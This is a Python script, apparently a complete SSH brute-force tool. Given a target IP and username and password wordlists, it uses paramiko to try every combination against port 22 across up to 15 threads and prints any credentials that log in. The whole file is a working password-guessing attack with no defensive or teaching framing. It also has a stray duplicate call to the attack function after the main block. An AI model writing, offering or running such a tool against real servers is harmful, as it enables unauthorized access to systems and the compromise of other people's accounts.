import paramiko
import socket
import sys
import threading
from queue import Queue


def ssh_attempt(host, port, username, password, timeout, result_queue, stop_event):
    if stop_event.is_set():
        return
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Trying {username}:{password}")
        client.connect(
            host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout
        )
        if not stop_event.is_set():  # double-check race condition
            print(f"\n[+] SUCCESS: Username: {username} | Password: {password}")
            result_queue.put((username, password))
            stop_event.set()
    except paramiko.AuthenticationException:
        pass
    except (socket.timeout, paramiko.SSHException):
        if not stop_event.is_set():  # don’t spam after success
            print("[!] Connection timed out or blocked")
    finally:
        client.close()


def ssh_brute(host, port, usernames, passwords, timeout=3, max_threads=15):
    result_queue = Queue()
    threads = []
    stop_event = threading.Event()

    for username in usernames:
        for password in passwords:
            if stop_event.is_set():
                break

            t = threading.Thread(
                target=ssh_attempt,
                args=(host, port, username.strip(), password.strip(), timeout, result_queue, stop_event)
            )
            threads.append(t)
            t.start()

            # Limit concurrent threads
            while threading.active_count() > max_threads:
                if stop_event.is_set():
                    break

        if stop_event.is_set():
            break

    # Only wait for threads until we find creds
    while any(t.is_alive() for t in threads):
        if stop_event.is_set():
            break

    if not result_queue.empty():
        username, password = result_queue.get()
        print(f"\n[+] Found valid credentials: {username}:{password}")
        return username, password
    else:
        print("\n[-] Failed to find valid credentials.")
        return None, None



def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = 22

    # Ask user for file paths interactively
    username_file = input("Enter path to usernames file: ").strip()
    password_file = input("Enter path to passwords file: ").strip()

    username_list = load_wordlist(username_file)
    password_list = load_wordlist(password_file)

    ssh_brute(target_ip, target_port, username_list, password_list)


ssh_brute(target_ip, target_port, username_list, password_list)
